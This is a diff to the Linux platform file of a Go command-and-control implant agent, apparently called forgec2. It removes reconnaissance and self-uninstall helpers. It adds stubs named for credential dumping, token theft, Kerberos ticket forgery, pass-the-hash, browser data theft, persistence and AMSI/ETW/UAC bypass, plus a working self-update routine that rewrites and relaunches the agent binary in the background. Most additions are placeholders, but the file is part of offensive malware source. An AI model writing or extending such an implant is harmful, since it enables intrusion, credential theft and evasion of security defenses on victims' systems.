@@ -12,7 +12,6 @@ import (
 	"os"
 	"os/exec"
 	"strings"
-	"time"
 )
 
 // Linux platform stubs. Screenshot / advanced features can be extended later
@@ -92,16 +91,6 @@ func regDeleteWindows(key string) error {
 	return fmt.Errorf("registry only on Windows")
 }
 
-func portScan(target string) (string, error) {
-	// reuse common? for linux use nc or timeout
-	parts := strings.Split(target, ":")
-	if len(parts) != 2 {
-		return "", fmt.Errorf("bad format")
-	}
-	// simplistic
-	return "portscan on linux: use nmap or nc", nil
-}
-
 // --- Stubs for new high-value features (1,3,4,6) ---
 
 func dumpCreds() (string, error) {
@@ -114,6 +103,10 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 
 func lateralMove(spec string) (string, error) {
 	return "", fmt.Errorf("lateral movement only supported on Windows Go agent")
+}
+
+func spawnProcess(targetExe string, shellcode []byte, technique string) string {
+	return "not supported on Linux"
 }
 
 func startSocksServer(addr string) {
@@ -133,29 +126,37 @@ func startSocksServer(addr string) {
 	}()
 }
 
-func netStat() (string, error) {
-	out, _ := runShell("netstat -tunap || ss -tunap", "")
-	return out, nil
+// tokenInfoResult — shared struct for token ops (defined here for Linux stubs)
+type tokenInfoResult struct {
+	PID         uint32
+	ProcessName string
+	Domain      string
+	Username    string
+	Integrity   string
+	TokenType   string
+	Error       string
 }
 
-func listUsers() (string, error) {
-	out, _ := runShell("who || w", "")
-	return out, nil
+// executeBOF is a Linux stub (runtime.GOOS check prevents calling it)
+func executeBOF(bofData []byte, args string) (string, error) {
+	return "", fmt.Errorf("BOF is Windows-only")
 }
 
-func detectAV() (string, error) {
-	return "AV detection on linux limited", nil
+// token ops stubs (runtime.GOOS check prevents calling on Linux)
+func tokenListProcesses() ([]tokenInfoResult, error) {
+	return nil, fmt.Errorf("token ops are Windows-only")
 }
-
-func uninstallSelf() (string, error) {
-	// remove cron etc best effort
-	runShell("crontab -l | grep -v forgec2 | crontab -", "")
-	exe, _ := os.Executable()
-	go func() {
-		time.Sleep(1 * time.Second)
-		os.Remove(exe)
-	}()
-	return "linux uninstall attempted", nil
+func tokenSteal(pid uint32) (string, string, string, error) {
+	return "", "", "", fmt.Errorf("token ops are Windows-only")
+}
+func getCurrentTokenUser() string {
+	return ""
+}
+func tokenMake(domainUser, password, logonTypeStr string) (string, string, string, error) {
+	return "", "", "", fmt.Errorf("token ops are Windows-only")
+}
+func tokenRevert() error {
+	return fmt.Errorf("token ops are Windows-only")
 }
 
 func sendP2PSMBBeacon(body []byte) []byte {
@@ -209,4 +210,96 @@ func p2pListenSMB() {
 		}
 		go p2pHandleChild(conn)
 	}
+}
+
+// --- Linux stubs for P0 features ---
+
+func peloaderReflective(b64Data string) (string, error) {
+	return "", fmt.Errorf("reflective DLL loader is Windows-only")
+}
+
+func executeAssemblyForkRun(b64Data string) (string, error) {
+	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
+}
+
+func rportfwdCollectOutbound() []socksFrame { return nil }
+func rportfwdHandleFrames(frames []socksFrame) {}
+func rportfwdDial(connID uint64, target string) {}
+func rportfwdWrite(connID uint64, data []byte) {}
+func rportfwdClose(connID uint64) {}
+
+func kerberosDCSync(user string) (string, error) {
+	return "", fmt.Errorf("DCSync is Windows-only")
+}
+func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
+	return "", fmt.Errorf("golden ticket is Windows-only")
+}
+func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
+	return "", fmt.Errorf("silver ticket is Windows-only")
+}
+func kerberosASREPRoast() (string, error) {
+	return "", fmt.Errorf("ASREP roast is Windows-only")
+}
+func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
+	return "", fmt.Errorf("pass-the-hash is Windows-only")
+}
+func kerberosPassTheTicket(ticketB64 string) (string, error) {
+	return "", fmt.Errorf("pass-the-ticket is Windows-only")
+}
+
+func powerPick(script string) string {
+	return "not supported on Linux"
+}
+
+func stealBrowserData(browser string) string {
+	return "browser data theft is Windows-only"
+}
+
+func applyPersistence(method string, args string) string {
+	return "not supported on Linux"
+}
+
+func listPersistence() string {
+	return "not supported on Linux"
+}
+
+func removePersistence(method string, args string) string {
+	return "not supported on Linux"
+}
+
+func uacBypass(method, payload string) string {
+	return "not supported on Linux"
+}
+
+func executeNetCommand(cmd string) string {
+	return "net command suite is Windows-only"
+}
+
+func amsiBypass() string {
+	return "not supported on Linux"
+}
+
+func etwBypass() string {
+	return "not supported on Linux"
+}
+
+func selfUpdateWindows(exe, tmpPath string) string {
+	return ""
+}
+
+func selfUpdateLinux(exe, tmpPath string) string {
+	shScript := fmt.Sprintf(
+		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
+		tmpPath, exe, exe, exe)
+	tmpScript := exe + ".update.sh"
+	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil {
+		return "failed to write update script: " + err.Error()
+	}
+
+	cmd := exec.Command("/bin/sh", "-c", "nohup '"+tmpScript+"' >/dev/null 2>&1 &")
+	if err := cmd.Start(); err != nil {
+		return "failed to start updater: " + err.Error()
+	}
+
+	return "self-update: new binary downloaded, replacing and restarting..."
 }
